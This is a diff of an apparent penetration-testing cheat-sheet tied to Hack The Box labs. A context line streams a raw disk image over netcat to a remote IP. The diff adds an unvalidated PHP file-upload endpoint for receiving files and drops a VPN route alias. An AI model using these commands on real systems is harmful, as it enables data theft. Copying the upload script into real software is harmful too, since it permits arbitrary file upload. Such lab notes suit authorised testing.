@@ -129,6 +129,7 @@ dd if=/dev/dm-0 | gzip - | nc 10.10.14.23 3142
 ```
 qemu-img convert vm.qcow2 vm.raw
 ```
+
 ### Get info
 ```
 mmls vm.raw
@@ -175,11 +176,20 @@ screen cmd.log
 exit
 ```
 
-## Fix VPN routing issue (HTB)
+## Create simple Upload Web Server
+1. create /var/www/uploads folder and set owner to www-data
+2. create /var/www/html/upload.php with following content
+```
+<?php
+$uploaddir = '/var/www/uploads/';
 
+$uploadfile = $uploaddir . $_FILES['file']['name'];
+
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
 ```
-fixvpn='sudo route del -net 10.10.10.0 gw 10.10.14.1 netmask 255.255.255.0 dev tun0'
-```
+3. Start apache2 server
+
 
 ## SimpleHTTPServer
 
